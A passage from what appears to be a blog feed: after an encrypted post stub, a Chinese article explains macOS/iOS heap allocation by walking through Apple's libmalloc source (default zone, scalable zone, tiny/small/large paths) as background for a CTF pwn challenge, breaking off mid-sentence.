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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an 